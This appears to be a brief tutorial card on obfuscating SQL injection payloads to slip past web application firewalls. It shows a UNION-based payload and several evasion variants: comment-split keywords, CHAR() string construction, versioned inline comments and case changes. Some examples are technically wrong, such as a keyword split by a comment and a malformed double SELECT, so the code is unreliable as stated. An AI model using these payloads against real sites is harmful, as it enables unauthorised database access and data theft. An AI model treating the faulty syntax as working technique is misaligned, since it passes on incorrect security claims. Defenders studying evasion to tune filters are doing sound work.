Practical Evasion

Bypassing WAFs for SQLi with Obfuscation

Using comments and alternative syntax to hide SQL keywords.

-- Original SQLi Payload (often blocked)
SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3

-- 1. SQL Comments to break keywords
SELECT * FROM users WHERE id = 1 UNIO/**/N SELECT 1,2,3

-- 2. Alternative Syntax (CHAR() function)
SELECT CHAR(100)+CHAR(97)+CHAR(116)+CHAR(97) -- 'data'

-- 3. Inline Comments
SELECT /*!50000UNION*/ SELECT 1,2,3

-- 4. Case Variation (WAFs might be case-sensitive)
select * from users where id = 1 union select 1,2,3

Obfuscation Techniques

  • SQL Comments: Break up keywords (e.g., `/**/`) to bypass simple string matching.
  • Alternative Syntax: Use functions like `CHAR()` to construct strings, avoiding literal keywords.
  • Case Variation: Exploit WAFs that are case-sensitive by changing letter casing.

Targeting Signatures

These methods aim to bypass WAFs that rely on exact string matching or simple regex patterns, forcing them to miss the malicious intent.

Key Takeaway

SQL comments and alternative function calls can obfuscate malicious SQL keywords, enabling bypass of WAF signature-based detection.
